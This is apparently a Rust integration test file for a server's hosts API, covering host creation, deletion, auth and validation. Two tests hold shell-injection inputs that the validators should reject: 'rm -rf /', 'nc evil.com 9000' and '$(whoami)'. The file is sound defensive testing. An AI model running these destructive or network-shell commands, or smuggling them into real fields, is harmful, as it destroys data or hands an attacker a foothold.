//! Integration tests for the hosts HTTP surface (REMOTE_PLAN.md RT8).
//!
//! Driven via `axum::Router::oneshot` against an isolated temp-dir database,
//! mirroring `tests/http_session.rs` (the M2 reference pattern). The auto-
//! check that fires after `POST /api/hosts` shells out to `ssh` against a
//! syntactically-valid-but-unroutable target — the spawn succeeds, the connect
//! fails with `Unreachable` in <10s. We assert the create payload still 201s
//! (the spec says auto-check is best-effort and MUST NOT fail the create).
//!
//! Covers RT8's acceptance bullets:
//!   * happy-path create → 201, get → 200, delete → 204.
//!   * duplicate-name create → 409.
//!   * delete with an active session referencing host_id → 409.
//!   * GET unknown id → 404.
//!   * POST with shell-meta in `ssh_target` → 400 (no ssh spawned).
//!   * POST `.../bootstrap` against localhost — `#[ignore]`'d.

use supermux_server::config::{Config, ProviderDefaults, TlsConfig};
use supermux_server::state::AppState;
use supermux_server::{db, http};

use axum::body::Body;
use axum::http::{header, Method, Request, StatusCode};
use http_body_util::BodyExt;
use serde_json::{json, Value};
use tower::ServiceExt;

const TOKEN: &str = "secret-test-token-rt8";

/// Spin up a fresh app + isolated DB. Returns the router and the temp dir
/// (caller removes it at end of test).
async fn test_app() -> (axum::Router, std::path::PathBuf, AppState) {
    let dir = std::env::temp_dir().join(format!("supermux-hosts-http-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&dir).unwrap();
    let config = Config {
        data_dir: dir.clone(),
        bind: "127.0.0.1:0".parse().unwrap(),
        extra_binds: vec![],
        tls: TlsConfig::default(),
        auth_token: TOKEN.to_string(),
        provider_defaults: ProviderDefaults::default(),
        ws: Default::default(),
            remote_callback_url: None,
            push_sub: None,
    };
    let pool = db::init(&config).await.expect("db init");
    let state = AppState::new(pool, config);
    let app = http::router(state.clone());
    (app, dir, state)
}

/// Authenticated request helper — returns (status, parsed-JSON-body).
async fn send(
    app: &axum::Router,
    method: Method,
    uri: &str,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let mut builder = Request::builder()
        .method(method)
        .uri(uri)
        .header(header::AUTHORIZATION, format!("Bearer {TOKEN}"));
    let req = match body {
        Some(b) => {
            builder = builder.header(header::CONTENT_TYPE, "application/json");
            builder.body(Body::from(b.to_string())).unwrap()
        }
        None => builder.body(Body::empty()).unwrap(),
    };
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    let value: Value = if bytes.is_empty() {
        Value::Null
    } else {
        serde_json::from_slice(&bytes).unwrap_or(Value::Null)
    };
    (status, value)
}

fn cleanup(dir: std::path::PathBuf) {
    let _ = std::fs::remove_dir_all(dir);
}

/// `ssh_target` we use across tests. Syntactically valid but unroutable, so
/// the auto-check inside `POST /api/hosts` fails quickly (Unreachable) without
/// any networking side effects. `.invalid` is RFC 6761-reserved for testing.
const UNROUTABLE_TARGET: &str = "user@nonexistent.invalid";

// ── happy path ────────────────────────────────────────────────────────────────

#[tokio::test]
async fn create_get_delete_happy_path() {
    let (app, dir, _state) = test_app().await;

    // POST → 201, payload has the row.
    let (status, body) = send(
        &app,
        Method::POST,
        "/api/hosts",
        Some(json!({
            "name": "alpha",
            "ssh_target": UNROUTABLE_TARGET,
        })),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED, "body: {body}");
    assert_eq!(body["ok"], json!(true));
    assert_eq!(body["data"]["name"], json!("alpha"));
    assert_eq!(body["data"]["ssh_target"], json!(UNROUTABLE_TARGET));
    // Auto-check ran — status is either `unreachable` (ssh failed to connect)
    // or `unknown` (something weirder). Either way the row exists.
    let id = body["data"]["id"].as_i64().expect("id is a number");
    assert!(id > 0);

    // GET → 200, same shape.
    let (status, body) = send(&app, Method::GET, &format!("/api/hosts/{id}"), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["data"]["id"], json!(id));
    assert_eq!(body["data"]["name"], json!("alpha"));

    // LIST → 200, contains the row.
    let (status, body) = send(&app, Method::GET, "/api/hosts", None).await;
    assert_eq!(status, StatusCode::OK);
    let rows = body["data"].as_array().unwrap();
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0]["id"], json!(id));

    // DELETE → 204 (no content).
    let (status, _body) = send(&app, Method::DELETE, &format!("/api/hosts/{id}"), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    // After delete: GET → 404, LIST → empty.
    let (status, _) = send(&app, Method::GET, &format!("/api/hosts/{id}"), None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let (status, body) = send(&app, Method::GET, "/api/hosts", None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["data"].as_array().unwrap().is_empty());

    cleanup(dir);
}

// ── duplicate name → 409 ──────────────────────────────────────────────────────

#[tokio::test]
async fn duplicate_name_returns_409() {
    let (app, dir, _state) = test_app().await;
    let body = json!({ "name": "dup", "ssh_target": UNROUTABLE_TARGET });

    let (status, _) = send(&app, Method::POST, "/api/hosts", Some(body.clone())).await;
    assert_eq!(status, StatusCode::CREATED);

    let (status, body) = send(&app, Method::POST, "/api/hosts", Some(body)).await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert_eq!(body["ok"], json!(false));

    cleanup(dir);
}

// ── active session blocks delete ──────────────────────────────────────────────

#[tokio::test]
async fn delete_refuses_when_active_session_references_host() {
    let (app, dir, state) = test_app().await;

    // Create the host via HTTP.
    let (status, body) = send(
        &app,
        Method::POST,
        "/api/hosts",
        Some(json!({ "name": "busy", "ssh_target": UNROUTABLE_TARGET })),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED);
    let host_id = body["data"]["id"].as_i64().unwrap();

    // Plant a session row pointing at this host_id with an ACTIVE runtime
    // status — the exact scenario the RT8 spec says must refuse delete.
    db::sessions::insert_minimal(&state.pool, "running", "/tmp/x", "shell")
        .await
        .unwrap();
    sqlx::query("UPDATE sessions SET host_id = ? WHERE name = ?")
        .bind(host_id)
        .bind("running")
        .execute(&state.pool)
        .await
        .unwrap();
    db::sessions::ensure_runtime(&state.pool, "running", "tok")
        .await
        .unwrap();
    db::sessions::set_last_status(&state.pool, "running", "active")
        .await
        .unwrap();

    // DELETE → 409 with a useful message.
    let (status, body) = send(&app, Method::DELETE, &format!("/api/hosts/{host_id}"), None).await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert_eq!(body["ok"], json!(false));
    let err = body["error"].as_str().unwrap_or("");
    assert!(err.contains("active session"), "got: {err}");

    // Stop the session — now delete succeeds.
    db::sessions::set_last_status(&state.pool, "running", "stopped")
        .await
        .unwrap();
    let (status, _) = send(&app, Method::DELETE, &format!("/api/hosts/{host_id}"), None).await;
    assert_eq!(status, StatusCode::NO_CONTENT);

    cleanup(dir);
}

// ── GET unknown id → 404 ──────────────────────────────────────────────────────

#[tokio::test]
async fn get_unknown_id_returns_404() {
    let (app, dir, _state) = test_app().await;
    let (status, body) = send(&app, Method::GET, "/api/hosts/9999", None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    assert_eq!(body["ok"], json!(false));
    cleanup(dir);
}

// ── shell-injection ssh_target → 400 (no ssh spawned) ─────────────────────────

#[tokio::test]
async fn invalid_ssh_target_returns_400_without_spawning_ssh() {
    let (app, dir, _state) = test_app().await;

    for evil in [
        "host;rm -rf /",
        "host && nc evil.com 9000",
        "$(whoami)@host",
        "host\nrm",
        "host:99999",
        "user with space@host",
    ] {
        let (status, body) = send(
            &app,
            Method::POST,
            "/api/hosts",
            Some(json!({ "name": "x", "ssh_target": evil })),
        )
        .await;
        assert_eq!(
            status,
            StatusCode::BAD_REQUEST,
            "{evil:?} should 400; got {status}: {body}"
        );
    }

    // The whole batch must NOT have created any row.
    let (status, body) = send(&app, Method::GET, "/api/hosts", None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["data"].as_array().unwrap().is_empty());

    cleanup(dir);
}

// ── name validation ───────────────────────────────────────────────────────────

#[tokio::test]
async fn invalid_name_returns_400() {
    let (app, dir, _state) = test_app().await;
    for bad in ["", " ", "with space", "back`tick", "slash/x", "semi;rm"] {
        let (status, _) = send(
            &app,
            Method::POST,
            "/api/hosts",
            Some(json!({ "name": bad, "ssh_target": UNROUTABLE_TARGET })),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{bad:?} should reject");
    }
    cleanup(dir);
}

// ── auth ──────────────────────────────────────────────────────────────────────

#[tokio::test]
async fn hosts_routes_require_auth() {
    let (app, dir, _state) = test_app().await;
    let resp = app
        .clone()
        .oneshot(
            Request::builder()
                .uri("/api/hosts")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
    cleanup(dir);
}

// ── check endpoint smoke ──────────────────────────────────────────────────────

#[tokio::test]
async fn check_endpoint_on_missing_host_404() {
    let (app, dir, _state) = test_app().await;
    let (status, _) = send(&app, Method::POST, "/api/hosts/12345/check", None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    cleanup(dir);
}

#[tokio::test]
async fn check_endpoint_on_unroutable_marks_unreachable() {
    let (app, dir, state) = test_app().await;
    let (status, body) = send(
        &app,
        Method::POST,
        "/api/hosts",
        Some(json!({ "name": "probe", "ssh_target": UNROUTABLE_TARGET })),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED);
    let id = body["data"]["id"].as_i64().unwrap();

    let (status, body) = send(&app, Method::POST, &format!("/api/hosts/{id}/check"), None).await;
    assert_eq!(status, StatusCode::OK);
    // Unroutable → unreachable; never `reachable`.
    let s = body["data"]["status"].as_str().unwrap();
    assert!(
        s == "unreachable" || s == "unknown",
        "expected unreachable/unknown, got {s}"
    );
    // last_seen is None (we never reached).
    assert!(body["data"].get("last_seen").is_none() || body["data"]["last_seen"].is_null());

    // The DB row reflects the same.
    let row = supermux_server::db::hosts::get(&state.pool, id)
        .await
        .unwrap()
        .unwrap();
    assert_eq!(row.status, s);

    cleanup(dir);
}

// ── bootstrap (gated) ─────────────────────────────────────────────────────────

/// Bootstrap test against localhost ssh — gated `#[ignore]` because most CI
/// environments don't have a passwordless ssh-into-self setup. Run with
/// `cargo test --release --test hosts_http -- --ignored bootstrap_localhost`
/// on a machine where `ssh -o BatchMode=yes localhost true` succeeds.
#[tokio::test]
#[ignore]
async fn bootstrap_localhost() {
    let (app, dir, _state) = test_app().await;
    let target = format!(
        "{}@localhost",
        std::env::var("USER").unwrap_or_else(|_| "root".into())
    );

    let (status, body) = send(
        &app,
        Method::POST,
        "/api/hosts",
        Some(json!({ "name": "self", "ssh_target": target })),
    )
    .await;
    assert_eq!(status, StatusCode::CREATED, "create body: {body}");
    let id = body["data"]["id"].as_i64().unwrap();

    let (status, body) = send(
        &app,
        Method::POST,
        &format!("/api/hosts/{id}/bootstrap"),
        Some(json!({})),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let data = &body["data"];
    // tmux should be installed on a dev machine — if not, the test still
    // exercises the warnings path.
    assert!(data.get("warnings").is_some());
    assert!(data.get("supermux_dir").is_some());

    cleanup(dir);
}

// ── bootstrap rejects bad pubkey ──────────────────────────────────────────────

#[tokio::test]
async fn bootstrap_rejects_invalid_pubkey() {
    let (app, dir, _state) = test_app().await;
    let (_, body) = send(
        &app,
        Method::POST,
        "/api/hosts",
        Some(json!({ "name": "pkrej", "ssh_target": UNROUTABLE_TARGET })),
    )
    .await;
    let id = body["data"]["id"].as_i64().unwrap();

    for evil in [
        "not-a-valid-algo AAAA",
        "ssh-ed25519 AAAA\nrm -rf /",
        "ssh-ed25519 AAAA`whoami`",
        "ssh-ed25519 AAAA;whoami",
        "ssh-ed25519 AAAA$(whoami)",
    ] {
        let (status, _) = send(
            &app,
            Method::POST,
            &format!("/api/hosts/{id}/bootstrap"),
            Some(json!({ "public_key": evil })),
        )
        .await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{evil:?} should reject");
    }
    cleanup(dir);
}
